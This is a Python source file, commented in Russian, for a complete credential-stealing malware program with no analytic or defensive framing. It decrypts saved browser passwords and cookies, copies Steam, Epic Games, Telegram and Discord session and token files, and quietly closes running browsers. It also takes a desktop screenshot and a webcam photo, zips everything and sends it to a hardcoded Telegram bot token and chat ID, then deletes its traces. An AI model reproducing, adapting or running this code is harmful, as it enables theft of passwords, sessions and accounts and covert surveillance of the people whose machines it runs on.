import platform
import socket
import psutil
import os
import json
import sqlite3
import telebot
import tempfile
import zipfile
import random
import time
import subprocess
import ctypes
import ctypes.wintypes
from datetime import datetime
from urllib.request import urlopen
from PIL import ImageGrab
import shutil
import base64
import re
import cv2
import sys
import traceback
from pathlib import Path
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
import browser_cookie3  # Добавлен импорт для работы с куками

# =============================================
# АВТОМАТИЧЕСКАЯ УСТАНОВКА ЗАВИСИМОСТЕЙ
# =============================================
def install_dependencies():
    """Устанавливает необходимые зависимости"""
    required_packages = [
        'pycryptodomex',
        'opencv-python',
        'pillow',
        'psutil',
        'python-telegram-bot',
        'pypiwin32; platform_system == "Windows"',
        'browser_cookie3'  # Добавлена новая зависимость
    ]
    
    try:
        # Проверяем, установлен ли уже Cryptodome
        from Cryptodome.Cipher import AES
        return  # Библиотеки уже установлены
    except ImportError:
        print("Установка необходимых библиотек...")
        try:
            for package in required_packages:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print("Библиотеки успешно установлены!")
        except Exception as e:
            print(f"Ошибка установки библиотек: {e}")
            sys.exit(1)

# Вызываем установку зависимостей при первом запуске
install_dependencies()

# Конфигурация Telegram
TELEGRAM_BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
TELEGRAM_CHAT_ID = "1962231620"
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Пути для хранения данных с использованием Path
if platform.system() == "Linux":
    BASE_DIR = Path.home() / ".system_report_data"
    BROWSER_DATA_DIR = Path.home() / ".config"
else:
    BASE_DIR = Path(os.getenv("APPDATA")) / "System_ReportData"
    BROWSER_DATA_DIR = Path(os.getenv("LOCALAPPDATA"))

# Определение структуры папок
OTHER_DIR = BASE_DIR / "other"
COOKIE_DIR = OTHER_DIR / "cookies"
PASSWORDS_DIR = OTHER_DIR / "passwords"
SCREENSHOT_PATH = BASE_DIR / "screenshot.jpg"
WEBCAM_PATH = BASE_DIR / "webcam.jpg"
LOCK_FILE = Path(tempfile.gettempdir()) / "system_report.lock"
DEBUG_LOG = BASE_DIR / "debug.log"  # Путь к файлу лога

# Поддерживаемые браузеры
BROWSERS = {
    "chrome": "Google Chrome",
    "firefox": "Mozilla Firefox",
    "yandex": "Yandex Browser",
    "opera": "Opera Browser",
    "amigo": "Amigo Browser",
    "edge": "Microsoft Edge",
    "brave": "Brave Browser",
    "vivaldi": "Vivaldi Browser",
    "chromium": "Chromium Browser"
}

def debug_log(message):
    """Записывает отладочные сообщения в файл"""
    try:
        with open(DEBUG_LOG, "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        print(f"Ошибка записи в лог: {e}")

# =============================================
# НОВАЯ СИСТЕМА СТИЛЛА КУКОВ ИЗ ВТОРОГО КОДА
# =============================================

def get_encryption_key(path):
    """Получает ключ шифрования с использованием win32crypt"""
    try:
        with open(os.path.join(path, 'Local State'), 'r', encoding='utf-8') as f:
            local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            # Удаляем префикс DPAPI
            encrypted_key = encrypted_key[5:]
            return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        debug_log(f"Ошибка получения ключа: {e}")
        return None

def decrypt_password(buffer, key):
    """Расшифровывает пароли с использованием AES-GCM"""
    try:
        iv = buffer[3:15]
        payload = buffer[15:-16]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload).decode()
    except Exception as e:
        debug_log(f"Ошибка дешифровки: {e}")
        return "[DECRYPT_FAIL]"

def get_browser_data(browser_func, profile_paths):
    """Основная функция для получения данных браузера"""
    results = {"cookies": [], "passwords": []}
    
    # Получение куков
    try:
        cookies = browser_func(domain_name='')
        for cookie in cookies:
            results["cookies"].append(f"{cookie.name}={cookie.value}")
    except Exception as e:
        debug_log(f"Ошибка получения куков: {e}")
        results["cookies"].append("Не удалось получить куки")
    
    # Получение паролей
    for profile_path in profile_paths:
        login_db = os.path.join(profile_path, "Login Data")
        if os.path.exists(login_db):
            try:
                temp_db = os.path.join(os.getenv("TEMP"), "temp_db")
                shutil.copy2(login_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                key = get_encryption_key(profile_path)
                for url, user, passw in cursor.fetchall():
                    decrypted = decrypt_password(passw, key) if key else "[NO_KEY]"
                    if user or decrypted != "[DECRYPT_FAIL]":
                        results["passwords"].append(f"{url} | {user} | {decrypted}")
                
                conn.close()
                os.remove(temp_db)
            except Exception as e:
                results["passwords"].append(f"Ошибка: {str(e)}")
    
    if not results["passwords"]:
        results["passwords"].append("Пароли не найдены")
    
    return results

# =============================================
# ОСНОВНЫЕ ФУНКЦИИ (С ИНТЕГРИРОВАННОЙ СИСТЕМОЙ КУКОВ)
# =============================================

def create_directories():
    """Гарантированно создает все необходимые директории"""
    try:
        BASE_DIR.mkdir(parents=True, exist_ok=True)
        OTHER_DIR.mkdir(parents=True, exist_ok=True)
        COOKIE_DIR.mkdir(parents=True, exist_ok=True)
        PASSWORDS_DIR.mkdir(parents=True, exist_ok=True)
        DEBUG_LOG.touch(exist_ok=True)
    except Exception as e:
        debug_log(f"!!! Критическая ошибка создания папок: {e}")

def get_cpu_name():
    """Получает читаемое имя процессора"""
    try:
        if platform.system() == "Windows":
            try:
                reg_key = ctypes.windll.advapi32.RegOpenKeyExW(
                    0x80000002,
                    r"HARDWARE\DESCRIPTION\System\CentralProcessor\0",
                    0,
                    0x20019
                )
                buf_size = ctypes.wintypes.DWORD(1024)
                buf = ctypes.create_unicode_buffer(buf_size.value)
                ctypes.windll.advapi32.RegQueryValueExW(
                    reg_key,
                    "ProcessorNameString",
                    None,
                    None,
                    ctypes.byref(buf),
                    ctypes.byref(buf_size)
                )
                ctypes.windll.advapi32.RegCloseKey(reg_key)
                cpu_name = buf.value.strip()
                cpu_name = re.sub(r'\([^)]*\)', '', cpu_name)
                return re.sub(r'\s+', ' ', cpu_name).strip()
            except:
                pass
        else:
            try:
                with open('/proc/cpuinfo') as f:
                    for line in f:
                        if 'model name' in line:
                            return line.split(':')[1].strip()
            except:
                return platform.processor() or "Unknown CPU"
    except:
        pass
    return platform.processor() or "Unknown CPU"

def stealthy_kill_browser(browser_name):
    """Скрытное закрытие браузера (только для Windows)"""
    if platform.system() != "Windows":
        return False

    process_map = {
        "chrome": "chrome.exe",
        "firefox": "firefox.exe",
        "opera": "opera.exe",
        "yandex": "browser.exe",
        "amigo": "browser.exe",
        "edge": "msedge.exe",
        "brave": "brave.exe",
        "vivaldi": "vivaldi.exe",
        "chromium": "chrome.exe"
    }
    
    target_process = process_map.get(browser_name)
    if not target_process:
        return False
    
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == target_process.lower():
                try:
                    hwnd = ctypes.windll.user32.FindWindowW(None, f"{BROWSERS[browser_name]}") 
                    if hwnd != 0:
                        ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
                    time.sleep(2)
                    if proc.is_running():
                        proc.terminate()
                except:
                    pass
        return True
    except Exception as e:
        debug_log(f"Ошибка при скрытном закрытии браузера: {e}")
        return False

def capture_webcam():
    """Делает снимок с веб-камеры, если она доступна"""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return False
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite(str(WEBCAM_PATH), frame)
            return True
    except:
        pass
    return False

def steal_steam_data():
    """Крадет данные Steam"""
    steam_dir = OTHER_DIR / "Steam"
    steam_dir.mkdir(parents=True, exist_ok=True)
    
    steam_paths = []
    if platform.system() == "Windows":
        steam_paths = [
            Path(os.getenv("ProgramFiles(x86)") or "") / "Steam" / "config",
            Path(os.getenv("APPDATA") or "") / "Steam",
            Path(os.getenv("LOCALAPPDATA") or "") / "Steam"
        ]
    else:
        steam_paths = [
            Path.home() / ".steam",
            Path.home() / ".local" / "share" / "Steam"
        ]
    
    stolen_data = []
    for path in steam_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith(("vdf", "ssfn", "config")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = steam_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except Exception as e:
                debug_log(f"Ошибка при краже данных Steam: {e}")
    
    if stolen_data:
        with open(steam_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_epic_games_data():
    """Крадет данные Epic Games"""
    epic_dir = OTHER_DIR / "EpicGames"
    epic_dir.mkdir(parents=True, exist_ok=True)
    
    epic_paths = []
    if platform.system() == "Windows":
        epic_paths = [
            Path(os.getenv("LOCALAPPDATA") or "") / "EpicGamesLauncher" / "Saved",
            Path(os.getenv("APPDATA") or "") / "Epic"
        ]
    else:
        epic_paths = [
            Path.home() / ".config" / "Epic",
            Path.home() / ".local" / "share" / "Epic"
        ]
    
    stolen_data = []
    for path in epic_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith(("ini", "dat", "log", "json")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = epic_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except Exception as e:
                debug_log(f"Ошибка при краже данных Epic Games: {e}")
    
    if stolen_data:
        with open(epic_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_telegram_data():
    """Крадет данные Telegram"""
    telegram_dir = OTHER_DIR / "Telegram"
    telegram_dir.mkdir(parents=True, exist_ok=True)
    
    telegram_paths = []
    if platform.system() == "Windows":
        telegram_paths = [
            Path(os.getenv("APPDATA") or "") / "Telegram Desktop" / "tdata",
            Path(os.getenv("LOCALAPPDATA") or "") / "Telegram Desktop"
        ]
    else:
        telegram_paths = [
            Path.home() / ".local" / "share" / "TelegramDesktop",
            Path.home() / ".TelegramDesktop"
        ]
    
    stolen_data = []
    for path in telegram_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith(("map", "s", "key")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = telegram_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except Exception as e:
                debug_log(f"Ошибка при краже данных Telegram: {e}")
    
    if stolen_data:
        with open(telegram_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_discord_data():
    """Крадет данные Discord"""
    discord_dir = OTHER_DIR / "Discord"
    discord_dir.mkdir(parents=True, exist_ok=True)
    
    discord_paths = []
    if platform.system() == "Windows":
        discord_paths = [
            Path(os.getenv("APPDATA") or "") / "discord" / "Local Storage" / "leveldb",
            Path(os.getenv("LOCALAPPDATA") or "") / "Discord"
        ]
    else:
        discord_paths = [
            Path.home() / ".config" / "discord",
            Path.home() / ".config" / "discordptb",
            Path.home() / ".config" / "discordcanary"
        ]
    
    stolen_data = []
    for path in discord_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith((".ldb", ".log", ".manifest", ".json")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = discord_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except Exception as e:
                debug_log(f"Ошибка при краже данных Discord: {e}")
    
    if stolen_data:
        with open(discord_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_passwords():
    """Крадет пароли из всех доступных браузеров"""
    try:
        if not PASSWORDS_DIR.exists():
            PASSWORDS_DIR.mkdir(parents=True, exist_ok=True)
        
        debug_log(f"[Кража паролей] Папка для сохранения: {PASSWORDS_DIR}")
        
        appdata = BROWSER_DATA_DIR
        roaming = Path(os.getenv("APPDATA") or "")
        
        browser_paths = {
            "chrome": [str(appdata / "Google" / "Chrome" / "User Data" / "Default")],
            "edge": [str(appdata / "Microsoft" / "Edge" / "User Data" / "Default")],
            "opera": [str(roaming / "Opera Software" / "Opera Stable")],
            "yandex": [str(appdata / "Yandex" / "YandexBrowser" / "User Data" / "Default")],
            "amigo": [str(appdata / "Amigo" / "User Data" / "Default")],
            "brave": [str(appdata / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default")],
            "vivaldi": [str(appdata / "Vivaldi" / "User Data" / "Default")],
            "chromium": [str(appdata / "Chromium" / "User Data" / "Default")]
        }
        
        browser_functions = {
            "chrome": browser_cookie3.chrome,
            "firefox": browser_cookie3.firefox,
            "edge": browser_cookie3.edge,
            "opera": browser_cookie3.opera,
            "brave": browser_cookie3.brave,
            "vivaldi": browser_cookie3.vivaldi,
            "chromium": browser_cookie3.chromium
        }
        
        for browser_name, display_name in BROWSERS.items():
            try:
                passwords = []
                
                if browser_name in browser_functions:
                    if platform.system() == "Windows":
                        stealthy_kill_browser(browser_name)
                        time.sleep(1)
                    
                    profile_paths = browser_paths.get(browser_name, [])
                    browser_data = get_browser_data(
                        browser_functions[browser_name],
                        profile_paths
                    )
                    passwords = browser_data["passwords"]
                
                if passwords:
                    password_file = PASSWORDS_DIR / f"{display_name}_Passwords.txt"
                    with open(password_file, 'w', encoding='utf-8') as f:
                        f.write("\n".join(passwords))
                    debug_log(f"Пароли {display_name} сохранены: {len(passwords)} записей")
                else:
                    debug_log(f"Для браузера {display_name} пароли не найдены")
                        
            except Exception as e:
                debug_log(f"Ошибка при краже паролей {browser_name}: {traceback.format_exc()}")
    except Exception as e:
        debug_log(f"Критическая ошибка в steal_passwords: {traceback.format_exc()}")

def steal_cookies():
    """Крадет куки из всех доступных браузеров (новая реализация)"""
    try:
        if not COOKIE_DIR.exists():
            COOKIE_DIR.mkdir(parents=True, exist_ok=True)
        
        debug_log(f"[Кража cookies] Папка для сохранения: {COOKIE_DIR}")
        
        browser_functions = {
            "chrome": browser_cookie3.chrome,
            "firefox": browser_cookie3.firefox,
            "edge": browser_cookie3.edge,
            "opera": browser_cookie3.opera,
            "brave": browser_cookie3.brave,
            "vivaldi": browser_cookie3.vivaldi,
            "chromium": browser_cookie3.chromium
        }
        
        appdata = BROWSER_DATA_DIR
        roaming = Path(os.getenv("APPDATA") or "")
        
        browser_paths = {
            "chrome": [str(appdata / "Google" / "Chrome" / "User Data" / "Default")],
            "edge": [str(appdata / "Microsoft" / "Edge" / "User Data" / "Default")],
            "opera": [str(roaming / "Opera Software" / "Opera Stable")],
            "yandex": [str(appdata / "Yandex" / "YandexBrowser" / "User Data" / "Default")],
            "amigo": [str(appdata / "Amigo" / "User Data" / "Default")],
            "brave": [str(appdata / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default")],
            "vivaldi": [str(appdata / "Vivaldi" / "User Data" / "Default")],
            "chromium": [str(appdata / "Chromium" / "User Data" / "Default")]
        }
        
        for browser_name, display_name in BROWSERS.items():
            try:
                cookies = []
                
                if browser_name in browser_functions:
                    if platform.system() == "Windows":
                        stealthy_kill_browser(browser_name)
                        time.sleep(1)
                    
                    profile_paths = browser_paths.get(browser_name, [])
                    browser_data = get_browser_data(
                        browser_functions[browser_name],
                        profile_paths
                    )
                    cookies = browser_data["cookies"]
                
                if cookies:
                    cookie_file = COOKIE_DIR / f"{display_name}_Cookies.txt"
                    with open(cookie_file, 'w', encoding='utf-8') as f:
                        f.write("\n".join(cookies))
                    debug_log(f"Куки {display_name} сохранены: {len(cookies)} записей")
                else:
                    debug_log(f"Для браузера {display_name} куки не найдены")
                        
            except Exception as e:
                debug_log(f"Ошибка при краже куки {browser_name}: {traceback.format_exc()}")
    except Exception as e:
        debug_log(f"Критическая ошибка в steal_cookies: {traceback.format_exc()}")

def get_ipinfo():
    """Получает информацию о IP"""
    try:
        response = urlopen('http://ipinfo.io/json')
        return json.load(response)
    except:
        return {"ip": "N/A", "org": "N/A", "city": "N/A", "region": "N/A", "country": "N/A"}

def get_system_info():
    """Собирает полную системную информацию"""
    ipinfo = get_ipinfo()
    
    cpu_info = {
        "model": get_cpu_name(),
        "physical_cores": psutil.cpu_count(logical=False),
        "logical_cores": psutil.cpu_count(logical=True),
        "max_frequency": psutil.cpu_freq().max if hasattr(psutil, "cpu_freq") and psutil.cpu_freq() else "N/A",
        "usage": psutil.cpu_percent(interval=1)
    }
    
    drives = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            drives.append({
                "device": part.device,
                "mountpoint": part.mountpoint,
                "fstype": part.fstype,
                "total_gb": round(usage.total / (1024**3), 2),
                "used_gb": round(usage.used / (1024**3), 2),
                "free_gb": round(usage.free / (1024**3), 2),
                "percent_used": usage.percent
            })
        except:
            continue
    
    network_info = {
        "public_ip": ipinfo.get("ip", "N/A"),
        "isp": ipinfo.get("org", "N/A"),
        "location": f"{ipinfo.get('city', 'N/A')}, {ipinfo.get('region', 'N/A')}, {ipinfo.get('country', 'N/A')}",
        "connections": []
    }
    
    return {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "system": {
            "os": platform.system(),
            "version": platform.version(),
            "release": platform.release(),
            "architecture": platform.architecture()[0],
            "hostname": socket.gethostname(),
            "username": os.getlogin()
        },
        "hardware": {
            "cpu": cpu_info,
            "memory": {
                "total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
                "available_gb": round(psutil.virtual_memory().available / (1024**3), 2),
                "used_percent": psutil.virtual_memory().percent
            },
            "disks": drives
        },
        "network": network_info,
        "software": {
            "python_version": platform.python_version()
        }
    }

def take_screenshot():
    """Делает скриншот рабочего стола"""
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(str(SCREENSHOT_PATH), "JPEG", quality=90)
        return True
    except Exception as e:
        debug_log(f"Ошибка создания скриншота: {traceback.format_exc()}")
        return False

def create_zip():
    """Создает ZIP-архив с данными"""
    zip_name = f"system_data_{random.randint(1000,9999)}.zip"
    zip_path = Path(tempfile.gettempdir()) / zip_name
    
    try:
        with zipfile.ZipFile(str(zip_path), 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(str(BASE_DIR)):
                for file in files:
                    file_path = Path(root) / file
                    arcname = file_path.relative_to(BASE_DIR)
                    try:
                        zipf.write(str(file_path), str(arcname))
                    except Exception as e:
                        debug_log(f"Ошибка добавления файла в архив: {file_path} - {e}")
                
            empty_folders = [
                OTHER_DIR,
                COOKIE_DIR,
                PASSWORDS_DIR,
                OTHER_DIR / "Steam",
                OTHER_DIR / "EpicGames",
                OTHER_DIR / "Telegram",
                OTHER_DIR / "Discord"
            ]
            
            for folder in empty_folders:
                if folder.exists() and folder.is_dir():
                    marker_file = folder / ".keep"
                    try:
                        marker_file.touch(exist_ok=True)
                        arcname = marker_file.relative_to(BASE_DIR)
                        zipf.write(str(marker_file), str(arcname))
                    except Exception as e:
                        debug_log(f"Не удалось создать маркер для {folder}: {e}")
            
        debug_log(f"Архив создан: {zip_path}")
        return zip_path
    except Exception as e:
        debug_log(f"Ошибка создания архива: {traceback.format_exc()}")
        return None

def send_to_telegram(zip_path):
    """Отправляет данные в Telegram"""
    try:
        if SCREENSHOT_PATH.exists():
            with open(str(SCREENSHOT_PATH), 'rb') as photo:
                bot.send_photo(
                    chat_id=TELEGRAM_CHAT_ID,
                    photo=photo,
                    caption="Скриншот рабочего стола"
                )
            time.sleep(1)

        if WEBCAM_PATH.exists():
            with open(str(WEBCAM_PATH), 'rb') as photo:
                bot.send_photo(
                    chat_id=TELEGRAM_CHAT_ID,
                    photo=photo,
                    caption="Снимок с веб-камеры"
                )
            time.sleep(1)

        sys_info = get_system_info()
        cpu_name = get_cpu_name()
        cpu_cores = f"{psutil.cpu_count(logical=False)}/{psutil.cpu_count(logical=True)} (физич./логич.)"
        cpu_usage = f"{psutil.cpu_percent(interval=1)}%"
        
        summary = (
            "СИСТЕМНЫЙ ОТЧЕТ\n"
            f"• ОС: {sys_info['system']['os']} {sys_info['system']['version']}\n"
            f"• Пользователь: {sys_info['system']['username']}\n"
            f"• Процессор: {cpu_name}\n"
            f"• Ядра: {cpu_cores}\n"
            f"• Нагрузка: {cpu_usage}\n"
            f"• ОЗУ: {sys_info['hardware']['memory']['total_gb']} GB\n"
            f"• IP: {sys_info['network']['public_ip']}\n"
            f"• Местоположение: {sys_info['network']['location']}"
        )
        bot.send_message(TELEGRAM_CHAT_ID, summary)
        time.sleep(1)

        if not zip_path or not zip_path.exists():
            bot.send_message(TELEGRAM_CHAT_ID, "Ошибка: архив не создан")
            return False
        
        zip_size = zip_path.stat().st_size / (1024 * 1024)
        
        if zip_size > 50:
            bot.send_message(
                TELEGRAM_CHAT_ID,
                f"Размер архива превышает 50 МБ ({zip_size:.2f} МБ). "
                "Данные не будут отправлены."
            )
            return False

        with open(str(zip_path), 'rb') as f:
            bot.send_document(
                chat_id=TELEGRAM_CHAT_ID,
                document=f,
                caption="Полные данные системы, куки, пароли и данные приложений",
                timeout=120
            )
        debug_log("Данные успешно отправлены в Telegram")
        return True
    except Exception as e:
        debug_log(f"Ошибка отправки в Telegram: {traceback.format_exc()}")
        return False

def cleanup():
    """Очищает следы"""
    try:
        if BASE_DIR.exists():
            shutil.rmtree(str(BASE_DIR), ignore_errors=True)
        if LOCK_FILE.exists():
            LOCK_FILE.unlink()
        for file in Path(tempfile.gettempdir()).iterdir():
            if file.name.startswith("temp_") and (file.name.endswith(".db") or file.name.endswith(".json")):
                try:
                    file.unlink()
                except:
                    pass
    except:
        pass

def main_workflow():
    """Основной рабочий процесс"""
    try:
        create_directories()
        sys_info = get_system_info()
        with open(BASE_DIR / "system_report.json", 'w', encoding='utf-8') as f:
            json.dump(sys_info, f, indent=4, ensure_ascii=False)
        steal_cookies()
        steal_passwords()
        steal_telegram_data()
        steal_discord_data()
        steal_steam_data()
        steal_epic_games_data()
        take_screenshot()
        capture_webcam()
        zip_file = create_zip()
        if zip_file:
            send_to_telegram(zip_file)
    except Exception as e:
        debug_log(f"Критическая ошибка в основном потоке: {traceback.format_exc()}")

if __name__ == "__main__":
    if LOCK_FILE.exists():
        sys.exit()
    try:
        with open(str(LOCK_FILE), 'w') as f:
            f.write(str(os.getpid()))
    except:
        sys.exit()
    try:
        main_workflow()
        debug_log("[+] Готово")
    except Exception as e:
        debug_log(f"!!! Критическая ошибка: {traceback.format_exc()}")
        try:
            bot.send_message(TELEGRAM_CHAT_ID, f"Критическая ошибка: {str(e)[:1000]}")
        except:
            pass
    finally:
        cleanup()
    print("Программа завершена. Окно закроется через 60 секунд...")
    time.sleep(60)
